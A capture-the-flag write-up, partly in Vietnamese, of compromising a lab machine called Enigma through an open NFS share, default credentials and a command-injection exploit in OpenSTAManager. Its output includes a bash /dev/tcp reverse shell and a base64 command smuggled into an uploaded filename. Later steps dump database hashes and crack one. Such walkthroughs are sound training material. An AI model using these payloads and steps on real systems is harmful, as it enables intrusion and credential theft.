# Enigma

<figure><img src="../../.gitbook/assets/image (21).png" alt=""><figcaption></figcaption></figure>

## RECON



### port scan



```bash
(base) ┌──(kali㉿kali)-[~/Desktop]
└─$ rustscan -a 10.129.37.88 -r0-65000 
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
I scanned ports so fast, even my computer was surprised.

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.129.37.88:22
Open 10.129.37.88:80
Open 10.129.37.88:111
Open 10.129.37.88:110
Open 10.129.37.88:143
Open 10.129.37.88:995
Open 10.129.37.88:993
Open 10.129.37.88:2049
Open 10.129.37.88:37687
Open 10.129.37.88:45565
Open 10.129.37.88:58941
```



```bash
PORT      STATE SERVICE  VERSION
22/tcp    open  ssh      OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
|_  256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
80/tcp    open  http     nginx 1.24.0 (Ubuntu)
|_http-server-header: nginx/1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://enigma.htb/
110/tcp   open  pop3     Dovecot pop3d
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=enigma
| Subject Alternative Name: DNS:enigma
| Not valid before: 2026-02-18T20:33:33
|_Not valid after:  2036-02-16T20:33:33
|_pop3-capabilities: TOP RESP-CODES UIDL SASL AUTH-RESP-CODE PIPELINING STLS CAPA
111/tcp   open  rpcbind  2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      38943/udp   mountd
|   100005  1,2,3      46179/tcp6  mountd
|   100005  1,2,3      50914/udp6  mountd
|   100005  1,2,3      58941/tcp   mountd
|   100021  1,3,4      35221/tcp6  nlockmgr
|   100021  1,3,4      45565/tcp   nlockmgr
|   100021  1,3,4      54822/udp6  nlockmgr
|   100021  1,3,4      58511/udp   nlockmgr
|   100024  1          37687/tcp   status
|   100024  1          45421/tcp6  status
|   100024  1          50007/udp6  status
|   100024  1          57016/udp   status
|   100227  3           2049/tcp   nfs_acl
|_  100227  3           2049/tcp6  nfs_acl
143/tcp   open  imap     Dovecot imapd (Ubuntu)
|_imap-capabilities: ENABLE OK LOGIN-REFERRALS more LITERAL+ have post-login ID capabilities LOGINDISABLEDA0001 SASL-IR IMAP4rev1 STARTTLS Pre-login IDLE listed
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=enigma
| Subject Alternative Name: DNS:enigma
| Not valid before: 2026-02-18T20:33:33
|_Not valid after:  2036-02-16T20:33:33
993/tcp   open  ssl/imap Dovecot imapd (Ubuntu)
|_ssl-date: TLS randomness does not represent time
|_imap-capabilities: ENABLE OK LOGIN-REFERRALS LITERAL+ more post-login have ID capabilities SASL-IR IMAP4rev1 AUTH=PLAINA0001 Pre-login IDLE listed
| ssl-cert: Subject: commonName=enigma
| Subject Alternative Name: DNS:enigma
| Not valid before: 2026-02-18T20:33:33
|_Not valid after:  2036-02-16T20:33:33
995/tcp   open  ssl/pop3 Dovecot pop3d
|_pop3-capabilities: TOP RESP-CODES UIDL USER AUTH-RESP-CODE PIPELINING SASL(PLAIN) CAPA
| ssl-cert: Subject: commonName=enigma
| Subject Alternative Name: DNS:enigma
| Not valid before: 2026-02-18T20:33:33
|_Not valid after:  2036-02-16T20:33:33
|_ssl-date: TLS randomness does not represent time
2049/tcp  open  nfs_acl  3 (RPC #100227)
40831/tcp open  mountd   1-3 (RPC #100005)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 22/tcp)
HOP RTT       ADDRESS
1   323.54 ms 10.10.14.1
2   324.01 ms 10.129.37.88

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Jul  1 06:07:01 2026 -- 1 IP address (1 host up) scanned in 41.90 seconds
```



```bash
PORT    STATE SERVICE
111/tcp open  rpcbind
| nfs-ls: Volume /srv/nfs/onboarding
|   access: Read Lookup NoModify NoExtend NoDelete NoExecute
| PERMISSION  UID  GID  SIZE  TIME                 FILENAME
| rwxr-xr-x   0    0    4096  2026-02-19T19:54:47  .
| ??????????  ?    ?    ?     ?                    ..
| rw-r--r--   0    0    1751  2026-02-19T19:53:57  New_Employee_Access.pdf
|_
| nfs-statfs: 
|   Filesystem           1K-blocks  Used       Available  Use%  Maxfilesize  Maxlink
|_  /srv/nfs/onboarding  8861044.0  6311508.0  2441428.0  73%   16.0T        32000
| nfs-showmount: 
|_  /srv/nfs/onboarding *
```



```bash
(base) ┌──(kali㉿kali)-[~/enigma]
└─$ showmount -e 10.129.37.88

Export list for 10.129.37.88:
/srv/nfs/onboarding *
                                                                                                                    
(base) ┌──(kali㉿kali)-[~/enigma]
└─$ rpcinfo -p 10.129.37.88

   program vers proto   port  service
    100000    4   tcp    111  portmapper
    100000    3   tcp    111  portmapper
    100000    2   tcp    111  portmapper
    100000    4   udp    111  portmapper
    100000    3   udp    111  portmapper
    100000    2   udp    111  portmapper
    100005    1   udp  47883  mountd
    100005    1   tcp  40191  mountd
    100005    2   udp  41411  mountd
    100005    2   tcp  40831  mountd
    100005    3   udp  38943  mountd
    100005    3   tcp  58941  mountd
    100024    1   udp  57016  status
    100024    1   tcp  37687  status
    100003    3   tcp   2049  nfs
    100003    4   tcp   2049  nfs
    100227    3   tcp   2049  nfs_acl
    100021    1   udp  58511  nlockmgr
    100021    3   udp  58511  nlockmgr
    100021    4   udp  58511  nlockmgr
    100021    1   tcp  45565  nlockmgr
    100021    3   tcp  45565  nlockmgr
    100021    4   tcp  45565  nlockmgr
                                                                                                                    
(base) ┌──(kali㉿kali)-[~/enigma]
└─$ mkdir nfs
                                                                                                                    
(base) ┌──(kali㉿kali)-[~/enigma]
└─$ sudo mount -t nfs 10.129.37.88:/srv/nfs/onboarding nfs
                                                                                                                    
(base) ┌──(kali㉿kali)-[~/enigma]
└─$ ls nfs                           
New_Employee_Access.pdf
```



<figure><img src="../../.gitbook/assets/image (22).png" alt=""><figcaption></figcaption></figure>





<figure><img src="../../.gitbook/assets/image (23).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/image (24).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/image (25).png" alt=""><figcaption></figcaption></figure>



dựa theo nội dung của file pdf thì có khả năng mật khẩu kia sẽ là default cho toàn bộ user mới , và ta sẽ thử với user `sarah`

<figure><img src="../../.gitbook/assets/image (26).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (27).png" alt=""><figcaption></figcaption></figure>

```bash
URL: http://support_001.enigma.htb
Username: admin
Password: Ne3s4rtars78s
```



<figure><img src="../../.gitbook/assets/image (28).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (986).png" alt=""><figcaption></figcaption></figure>



```bash
(base) ┌──(kali㉿kali)-[~/enigma]
└─$ python3 /tmp/CVE-2026-69212/CVE-2025-69212.py \
  -u http://support_001.enigma.htb \
  -U admin \
  -P 'Ne3s4rtars78s' \
  --lhost 10.10.14.110 \
  --lport 4444 2>&1

CVE-2025-69212 | OpenSTAManager <= 2.9.8 | OS Command Injection
GHSA-25fp-8w8p-mx36 | src/Util/XML.php exec() unsanitized P7M filename

--------------------------------------------------------
  REVERSE SHELL
--------------------------------------------------------
    LHOST   : 10.10.14.110
    LPORT   : 4444
    Payload : bash -i >& /dev/tcp/10.10.14.110/4444 0>&1

    [!] Make sure your listener is running: nc -lvnp 4444

--------------------------------------------------------
  EXPLOITATION
--------------------------------------------------------
[*] Logging in as admin ...
[+] Login successful!
[*] Building malicious ZIP ...
    Filename  : invoice.p7m";echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMTAvNDQ0NCAwPiYx|base64 -d|bash;echo ".p7m
[*] Sending payload to http://support_001.enigma.htb/actions.php ...
[+] Payload fired! (connection held open by bash — that's expected)

[+] Check your nc listener for a shell!

[+] Done.
```



```bash
└─$ nc -nlvp 4444 
listening on [any] 4444 ...
connect to [10.10.14.110] from (UNKNOWN) [10.129.37.88] 47614
bash: cannot set terminal process group (1536): Inappropriate ioctl for device
bash: no job control in this shell
www-data@enigma:~/html/openstamanager$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@enigma:~/html/openstamanager$ 
```



```bash
www-data@enigma:~/html/openstamanager$ cat config.php
cat config.php
<?php

/*
 * OpenSTAManager: il software gestionale open source per l'assistenza tecnica e la fatturazione
 * Copyright (C) DevCode s.r.l.
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program. If not, see <https://www.gnu.org/licenses/>.
 */

// Impostazioni di base per l'accesso al database
$db_host = '|host|';
$db_username = '|username|';
$db_password = '|password|';
$db_name = '|database|';
// $port = '|port|';
$db_options = [
    // 'sort_buffer_size' => '2M',
];

// Tema selezionato per il front-end
$theme = 'default';

// Impostazioni di sicurezza
$redirectHTTPS = false; // Redirect automatico delle richieste da HTTP a HTTPS
$disableCSRF = true; // Protezione contro CSRF

// Impostazioni di debug
$debug = false;

$disable_hooks = false;

// Permette di accedere solo con un ip (da utilizzare per manutenzione)
$maintenance_ip = '';

// Personalizzazione dei gestori dei tag personalizzati
$HTMLWrapper = null;
$HTMLHandlers = [];
$HTMLManagers = [];

// Lingua del progetto (per la traduzione e la conversione numerica)
$lang = 'en';
// Personalizzazione della formattazione di timestamp, date e orari
$formatter = [
    'timestamp' => '|timestamp|',
    'date' => '|date|',
    'time' => '|time|',
    'number' => [
        'decimals' => '|decimals|',
        'thousands' => '|thousands|',
    ],
];

// Ulteriori file CSS e JS da includere
$assets = [
    'css' => [],
    'print' => [],
    'js' => [],
];

// Configura il limite di tempo di esecuzione del file cron.php
$php_time_limit = '';
```



```bash
www-data@enigma:~/html/openstamanager$ cat config.inc.php
cat config.inc.php
<?php

/*
 * OpenSTAManager: il software gestionale open source per l'assistenza tecnica e la fatturazione
 * Copyright (C) DevCode s.r.l.
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program. If not, see <https://www.gnu.org/licenses/>.
 */

// Impostazioni di base per l'accesso al database
$db_host = 'localhost';
$db_username = 'brollin';
$db_password = 'Fri3nds@9099';
$db_name = 'openstamanager';
// $port = '|port|';
$db_options = [
    // 'sort_buffer_size' => '2M',
];

// Tema selezionato per il front-end
$theme = 'default';

// Impostazioni di sicurezza
$redirectHTTPS = false; // Redirect automatico delle richieste da HTTP a HTTPS
$disableCSRF = true; // Protezione contro CSRF

// Impostazioni di debug
$debug = false;

$disable_hooks = false;

// Permette di accedere solo con un ip (^[da utilizzare per manutenzione)
$maintenance_ip = '';

// Personalizzazione dei gestori dei tag personalizzati
$HTMLWrapper = null;
$HTMLHandlers = [];
$HTMLManagers = [];

// Lingua del progetto (per la traduzione e la conversione numerica)
$lang = 'en_GB';
// Personalizzazione della formattazione di timestamp, date e orari
$formatter = [
    'timestamp' => 'd/m/Y H:i',
    'date' => 'd/m/Y',
    'time' => 'H:i',
    'number' => [
        'decimals' => ',',
        'thousands' => '',
    ],
];

// Ulteriori file CSS e JS da includere
$assets = [
    'css' => [],
    'print' => [],
    'js' => [],
];

// Configura il limite di tempo di esecuzione del file cron.php
$php_time_limit = '';
```



```bash
www-data@enigma:~/html/openstamanager$ mysql -h 127.0.0.1 -u brollin -p'Fri3nds@9099' openstamanager -e "SHOW TABLES;"
<n -p'Fri3nds@9099' openstamanager -e "SHOW TABLES;"
mysql: [Warning] Using a password on the command line interface can be insecure.
Tables_in_openstamanager
an_anagrafiche
an_anagrafiche_agenti
an_assicurazione_crediti
an_mansioni
an_nazioni
an_nazioni_lang
an_pagamenti_anagrafiche
an_provenienze
an_provenienze_lang
an_referenti
an_regioni
an_regioni_lang
an_relazioni
an_relazioni_lang
an_sdi
an_sedi
an_sedi_tecnici
an_settori
an_settori_lang
an_tipianagrafiche
an_tipianagrafiche_anagrafiche
an_tipianagrafiche_lang
an_zone
co_banche
co_categorie_contratti
co_categorie_contratti_lang
co_contratti
co_contratti_tipiintervento
co_dichiarazioni_intento
co_documenti
co_fatturazione_contratti
co_iva
co_iva_lang
co_mandati_sepa
co_movimenti
co_movimenti_modelli
co_pagamenti
co_pagamenti_lang
co_pianodeiconti1
co_pianodeiconti2
co_pianodeiconti3
co_preventivi
co_promemoria
co_provvigioni
co_riferimenti_righe
co_righe_ammortamenti
co_righe_contratti
co_righe_documenti
co_righe_preventivi
co_righe_promemoria
co_ritenuta_contributi
co_ritenutaacconto
co_rivalse
co_scadenziario
co_stampecontabili
co_staticontratti
co_staticontratti_lang
co_statidocumento
co_statidocumento_lang
co_statipreventivi
co_statipreventivi_lang
co_tipi_scadenze
co_tipi_scadenze_lang
co_tipidocumento
co_tipidocumento_lang
do_categorie
do_categorie_lang
do_documenti
do_permessi
dt_aspettobeni
dt_aspettobeni_lang
dt_causalet
dt_causalet_lang
dt_ddt
dt_porto
dt_porto_lang
dt_righe_ddt
dt_spedizione
dt_spedizione_lang
dt_statiddt
dt_statiddt_lang
dt_tipiddt
dt_tipiddt_lang
em_accounts
em_email_attachment
em_email_print
em_email_receiver
em_email_upload
em_emails
em_files_categories_template
em_list_receiver
em_lists
em_lists_lang
em_mansioni_template
em_newsletter_receiver
em_newsletters
em_print_template
em_templates
em_templates_lang
fe_causali_pagamento_ritenuta
fe_modalita_pagamento
fe_modalita_pagamento_lang
fe_natura
fe_natura_lang
fe_regime_fiscale
fe_regime_fiscale_lang
fe_stati_documento
fe_stati_documento_lang
fe_tipi_documento
fe_tipi_documento_lang
fe_tipi_ritenuta
fe_tipo_cassa
in_fasceorarie
in_fasceorarie_lang
in_fasceorarie_tipiintervento
in_interventi
in_interventi_tags
in_interventi_tecnici
in_interventi_tecnici_assegnati
in_righe_interventi
in_righe_tipiinterventi
in_statiintervento
in_statiintervento_lang
in_tags
in_tariffe
in_tipiintervento
in_tipiintervento_lang
mg_articoli
mg_articoli_barcode
mg_articoli_lang
mg_articolo_attributo
mg_attributi
mg_attributi_lang
mg_attributo_combinazione
mg_causali_movimenti
mg_causali_movimenti_lang
mg_combinazioni
mg_combinazioni_lang
mg_fornitore_articolo
mg_listini
mg_listini_articoli
mg_movimenti
mg_piani_sconto
mg_prezzi_articoli
mg_prodotti
mg_scorte_sedi
mg_unitamisura
mg_valori_attributi
my_componenti
my_componenti_interventi
my_impianti
my_impianti_contratti
my_impianti_interventi
my_impianto_componenti
or_ordini
or_righe_ordini
or_statiordine
or_statiordine_lang
or_tipiordine
or_tipiordine_lang
updates
zz_api_log
zz_api_resources
zz_cache
zz_cache_lang
zz_categorie
zz_categorie_lang
zz_check_user
zz_checklist_items
zz_checklists
zz_checks
zz_currencies
zz_currencies_lang
zz_default_description
zz_default_description_module
zz_events
zz_field_record
zz_fields
zz_files
zz_files_categories
zz_files_print
zz_group_module
zz_group_module_lang
zz_group_segment
zz_group_view
zz_groups
zz_groups_lang
zz_hooks
zz_hooks_lang
zz_imports
zz_imports_lang
zz_langs
zz_logs
zz_marche
zz_modules
zz_modules_lang
zz_notes
zz_oauth2
zz_operations
zz_otp_tokens
zz_permissions
zz_plugins
zz_plugins_lang
zz_prints
zz_prints_lang
zz_segments
zz_segments_lang
zz_semaphores
zz_settings
zz_settings_lang
zz_storage_adapters
zz_tasks
zz_tasks_lang
zz_tasks_logs
zz_tokens
zz_user_sedi
zz_users
zz_views
zz_views_lang
zz_widgets
zz_widgets_lang
```



```bash
www-data@enigma:~/html/openstamanager$ mysql -h 127.0.0.1 -u brollin -p'Fri3nds@9099' openstamanager -e "SELECT * FROM zz_users\G;"   
<9099' openstamanager -e "SELECT * FROM zz_users\G;"
mysql: [Warning] Using a password on the command line interface can be insecure.
*************************** 1. row ***************************
           id: 1
     username: admin
     password: $2y$10$rTJVUNyGGKPlhw2cFdf5AeDHVMhnIChddcHx2XxVLMQS2KsuSz4Pu
        email: admin@enigma.htb
 idanagrafica: 1
     idgruppo: 1
      enabled: 1
   created_at: 2026-02-18 19:26:52
   updated_at: 2026-02-18 19:26:52
  reset_token: NULL
image_file_id: NULL
      options: 
*************************** 2. row ***************************
           id: 2
     username: haris
     password: $2y$10$WHf1T79sxjsZongUKT2jGeexTkvihBQyCZeoYXmObiNphrsZDr6eC
        email: haris@enigma.htb
 idanagrafica: 1
     idgruppo: 5
      enabled: 1
   created_at: 2026-02-18 20:58:28
   updated_at: 2026-05-26 11:07:03
  reset_token: NULL
image_file_id: NULL
      options: 
www-data@enigma:~/html/openstamanager$ 
```



```bash
└─$ hashcat -m 3200 -a 0 h1.txt /usr/share/wordlists/rockyou.txt
hashcat (v7.1.2) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #01: cpu-haswell-12th Gen Intel(R) Core(TM) i5-12450HX, 2336/4673 MB (1024 MB allocatable), 7MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 72
Minimum salt length supported by kernel: 0
Maximum salt length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Single-Hash
* Single-Salt

Watchdog: Temperature abort trigger set to 90c

Host memory allocated for this attack: 512 MB (2033 MB free)

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

Cracking performance lower than expected?                 

* Append -w 3 to the commandline.
  This can cause your screen to lag.

* Append -S to the commandline.
  This has a drastic speed impact but can be better for specific attacks.
  Typical scenarios are a small wordlist but a large ruleset.

* Update your backend API runtime / driver the right way:
  https://hashcat.net/faq/wrongdriver

* Create more work items to make use of your parallelization power:
  https://hashcat.net/faq/morework

$2y$10$WHf1T79sxjsZongUKT2jGeexTkvihBQyCZeoYXmObiNphrsZDr6eC:bestfriends
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 3200 (bcrypt $2*$, Blowfish (Unix))
Hash.Target......: $2y$10$WHf1T79sxjsZongUKT2jGeexTkvihBQyCZeoYXmObiNp...ZDr6eC
Time.Started.....: Wed Jul  1 08:40:43 2026 (31 secs)
Time.Estimated...: Wed Jul  1 08:41:14 2026 (0 secs)
Kernel.Feature...: Pure Kernel (password length 0-72 bytes)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#01........:       23 H/s (52.01ms) @ Accel:7 Loops:32 Thr:1 Vec:1
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 686/14344385 (0.00%)
Rejected.........: 0/686 (0.00%)
Restore.Point....: 637/14344385 (0.00%)
Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:992-1024
Candidate.Engine.: Device Generator
Candidates.#01...: loser -> zachary
Hardware.Mon.#01.: Util: 74%

Started: Wed Jul  1 08:38:51 2026
Stopped: Wed Jul  1 08:41:16 2026
```



```bash
(base) ┌──(kali㉿kali)-[~/enigma]
└─$ ssh haris@10.129.37.88                           
The authenticity of host '10.129.37.88 (10.129.37.88)' can't be established.
ED25519 key fingerprint is: SHA256:OZNUeTZ9jastNKKQ1tFXatbeOZzSFg5Dt7nhwhjorR0
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:22: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.37.88' (ED25519) to the list of known hosts.
haris@10.129.37.88: Permission denied (publickey).
```



```bash
www-data@enigma:~/html/openstamanager$ cat /etc/passwd
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin
messagebus:x:101:102::/nonexistent:/usr/sbin/nologin
systemd-resolve:x:992:992:systemd Resolver:/:/usr/sbin/nologin
pollinate:x:102:1::/var/cache/pollinate:/bin/false
polkitd:x:991:991:User for polkitd:/:/usr/sbin/nologin
syslog:x:103:104::/nonexistent:/usr/sbin/nologin
uuidd:x:104:105::/run/uuidd:/usr/sbin/nologin
tcpdump:x:105:107::/nonexistent:/usr/sbin/nologin
tss:x:106:108:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:107:109::/var/lib/landscape:/usr/sbin/nologin
fwupd-refresh:x:989:989:Firmware update daemon:/var/lib/fwupd:/usr/sbin/nologin
usbmux:x:108:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
_laurel:x:999:988::/var/log/laurel:/bin/false
haris:x:1000:1000:,,,:/home/haris:/bin/bash
mysql:x:110:111:MySQL Server,,,:/nonexistent:/bin/false
postfix:x:111:113::/var/spool/postfix:/usr/sbin/nologin
dovecot:x:112:115:Dovecot mail server,,,:/usr/lib/dovecot:/usr/sbin/nologin
dovenull:x:113:116:Dovecot login user,,,:/nonexistent:/usr/sbin/nologin
kevin:x:1001:1001::/home/kevin:/usr/sbin/nologin
sarah:x:1002:1002::/home/sarah:/usr/sbin/nologin
_rpc:x:114:65534::/run/rpcbind:/usr/sbin/nologin
statd:x:115:65534::/var/lib/nfs:/usr/sbin/nologin
it:x:1003:1003::/home/it:/usr/sbin/nologin
dhcpcd:x:100:65534:DHCP Client Daemon,,,:/usr/lib/dhcpcd:/bin/false

```





Sau khi crack được mật khẩu `bestfriends`, mình thử sử dụng `su` và `ssh` để đăng nhập vào tài khoản `haris` nhưng cả hai đều bị treo. Nguyên nhân là shell ban đầu chỉ là **non-interactive reverse shell**, không có **TTY (pseudo-terminal)** nên các chương trình như `su` và `ssh` không thể hiển thị hoặc xử lý quá trình nhập mật khẩu. Sau khi nâng cấp shell bằng `python3 -c 'import pty; pty.spawn("/bin/bash")'` và cấu hình lại terminal với `stty raw -echo`, shell trở thành interactive TTY, cho phép `su` hoạt động bình thường và đăng nhập thành công vào tài khoản `haris`.

```bash
www-data@enigma:~$ python3 -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@enigma:~$ ^Z  
zsh: suspended  nc -nlvp 4444
                                                                                                                                                                                                                                            
(base) ┌──(kali㉿kali)-[~/enigma/CVE-2025-69212-Authenticated-RCE-PoC]
└─$ stty raw -echo
fg
[1]  + continued  nc -nlvp 4444

www-data@enigma:~$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@enigma:~$ export TERM=xterm
www-data@enigma:~$ stty rows 40 cols 120
www-data@enigma:~$ su haris
Password: 
haris@enigma:/var/www$ cd
haris@enigma:~$ cat user.txt
5b7938d3d888ae11f5cc9a2ec538b09c
```

